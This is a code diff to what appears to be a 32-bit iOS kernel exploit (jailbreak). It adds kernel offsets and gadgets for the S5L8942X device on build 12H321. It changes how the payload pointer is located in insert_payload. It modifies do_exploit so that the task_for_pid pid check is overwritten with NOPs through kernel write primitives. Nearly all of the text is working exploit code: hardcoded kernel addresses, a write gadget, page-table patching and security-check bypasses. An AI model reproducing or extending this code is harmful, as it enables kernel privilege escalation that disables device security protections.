@@ -77,6 +77,7 @@ kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_
 
 mach_port_t tfp0;
 int isIOS9=0;
+int isA6=0;
 
 void copyin(void* to, uint32_t from, size_t size) {
     mach_vm_size_t outsize = size;
@@ -254,6 +255,45 @@ uint32_t koffsets_S5L8950X_12H321[] = {
     0,
 };
 
+uint32_t koffsets_S5L8942X_12H321[] = {
+    0x2D4A1C,   // OSSerializer::serialize
+    0x2D6AFC,   // OSSymbol::getMetaClass
+    0x1D0A0,    // calend_gettime
+    0xC3718,    // _bufattr_cpx
+    0x3ACCDC,   // clock_ops
+    0xB1744,    // _copyin
+    0xC371A,    // BX LR
+    0xB1488,    // write_gadget: str r1, [r0, #0xc] , bx lr
+    0x3F3128,   // vm_kernel_addrperm
+    0x3A211C,   // kernel_pmap
+    0xA6D10,    // flush_dcache
+    0xB14E0,    // invalidate_tlb
+    0x2BBDD0,   // task_for_pid
+    0x16+2,     // pid_check_addr offset
+    0x3e,       // posix_check_ret_addr offset
+    0x222,      // mac_proc_check_ret_addr offset
+    0x3F4810,   // allproc
+    0x8,        // proc_t::p_pid
+    0x8c,       // proc_t::p_ucred
+    
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+};
+
 uint32_t koffsets_S5L8950X_13A452[] = {
     0x31e7bc,   // OSSerializer::serialize
     0x320f00,   // OSSymbol::getMetaClass
@@ -309,6 +349,12 @@ void offsets_init(void){
     if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:44 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8950X") == 0) {
         printf("S5L8950X: 12H321\n");
         offsets = koffsets_S5L8950X_12H321;
+        isA6 = 1;
+    }
+    
+    if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:26:26 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8942X") == 0) {
+        printf("S5L8942X: 12H321\n");
+        offsets = koffsets_S5L8942X_12H321;
     }
     
     if (strcmp(u.version, "Darwin Kernel Version 15.0.0: Thu Aug 20 13:11:13 PDT 2015; root:xnu-3248.1.3~1/RELEASE_ARM_S5L8950X") == 0) {
@@ -521,7 +567,11 @@ void *insert_payload(void *ptr) {
             //printf("%02x ", (unsigned char)buffer[i]);
         }
         //printf("\n");
-        payload_ptr = *(uint32_t *)(buffer+16);
+        if(!isA6&&!isIOS9){
+            payload_ptr = *(uint32_t *)(buffer+12); // ?
+        } else {
+            payload_ptr = *(uint32_t *)(buffer+16);
+        }
     }
     
     *(uint32_t *)clock_ops_overwrite = kernel_base + koffset(offsetof_OSSerializer_serialize) + 1;
@@ -725,13 +775,13 @@ void do_exploit(uint32_t kernel_base){
     
     patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
     
-    if(!isIOS9){
-        uint32_t pid_check_val = read_primitive(pid_check_addr);
-        pid_check_val |= 0xff;
-        write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
-    } else {
+    //if(!isIOS9){
+    //    uint32_t pid_check_val = read_primitive(pid_check_addr);
+    //    pid_check_val |= 0xff;
+    //    write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
+    //} else {
         write_primitive(pid_check_addr, 0xbf00bf00); // beq -> NOP
-    }
+    //}
     
     usleep(100000);
     
